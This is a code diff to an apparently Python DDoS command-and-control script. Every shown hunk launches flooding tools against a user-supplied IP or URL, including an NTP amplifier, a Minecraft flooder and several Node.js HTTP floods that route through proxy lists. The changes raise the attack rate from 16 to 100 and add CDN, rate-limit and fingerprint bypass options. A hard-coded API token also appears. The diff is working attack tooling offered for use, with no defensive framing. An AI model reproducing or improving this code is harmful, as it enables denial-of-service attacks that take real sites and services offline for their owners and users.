@@ -672,7 +672,7 @@ def main():
                 throttle = cnc.split()[2]
                 threads = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'./MINECRAFT-SLAM {ip} 16 8 {time}')
+                os.system(f'./MINECRAFT-SLAM {ip} 100 8 {time}')
                 token = "727e8c2fa5b07c"
                 ip = f"{ip}"
                 info = get_ip_info(token, ip)
@@ -704,7 +704,7 @@ def main():
                 port = cnc.split()[2]
                 throttle = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'./ntp {ip} {port} ntp.txt 16 {time}')
+                os.system(f'./ntp {ip} {port} ntp.txt 100 {time}')
                 token = "727e8c2fa5b07c"
                 ip = f"{ip}"
                 info = get_ip_info(token, ip)
@@ -776,7 +776,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node cf-flood.js {url} {time} 16 8 proxies.txt')          
+               os.system(f'node cf-flood.js {url} {time} 100 8 proxies.txt')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -803,7 +803,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-holdv2.js {url} {time} 16 8 proxies.txt')     
+               os.system(f'node h2-holdv2.js {url} {time} 100 8 proxies.txt')     
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -830,7 +830,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node h2-bypass.js POST {url} {time} 16 8 proxies.txt --randrate true --debug true')          
+               os.system(f'node h2-bypass.js POST {url} {time} 100 8 proxies.txt --cdn true --ratelimit true --randpath true --randrate true --debug true')          
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -857,7 +857,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                              
-               os.system(f'node cfgas.js {url} {time} 16 8 proxies.txt')
+               os.system(f'node cfgas.js {url} {time} 100 8 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -884,7 +884,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                 
-               os.system(f'node h2-holdv2.js {url} {time} 16 8 proxies.txt')     
+               os.system(f'node httpbypass.js {url} {time} 100 8 proxies.txt --fingerprint --fullheaders --randompath')     
                
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
@@ -910,7 +910,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node httpbypassv2.js {url} {time} 16 8 proxies.txt')        
+               os.system(f'node httpbypassv2.js {url} {time} 100 8 proxies.txt')        
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -937,7 +937,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                                
-               os.system(f'node autov2.js {url} {time} 16 8 proxies.txt')        
+               os.system(f'node autov2.js {url} {time} 100 8 proxies.txt')        
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1029,8 +1029,8 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node httpget GET {url} {time} 16 8 proxies.txt')
-               os.system(f'node httpgetv2 GET {url} {time} 16 8 proxies.txt')
+               os.system(f'node httpget GET {url} {time} 100 8 proxies.txt')
+               os.system(f'node httpgetv2 GET {url} {time} 100 8 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
@@ -1057,7 +1057,7 @@ def main():
                url, time = cnc.split()[1:3]
                os.system("clear")  # Bersihkan layar (opsional)
                
-               os.system(f'node http-storm.js {url} {time} 16 8 proxies.txt')
+               os.system(f'node http-storm.js {url} {time} 100 8 proxies.txt')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
